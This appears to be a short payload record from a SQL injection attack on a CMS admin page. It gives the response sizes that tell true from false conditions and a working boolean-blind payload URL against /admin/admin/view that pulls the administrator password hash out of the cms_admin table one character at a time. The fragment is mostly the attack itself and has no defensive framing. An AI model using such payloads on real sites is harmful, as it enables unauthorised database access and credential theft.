payload.description: True condition - returns normal page (29723 bytes)
False condition - returns empty page (28932 bytes)
SQL syntax error - returns 500 error page
Extract database name via boolean blind

payload.url: /admin/admin/view?id=1' AND ASCII(SUBSTRING((SELECT pwd FROM cms_admin LIMIT 1),1,1))>50-- -
payload.description: Extract admin password hash character by character
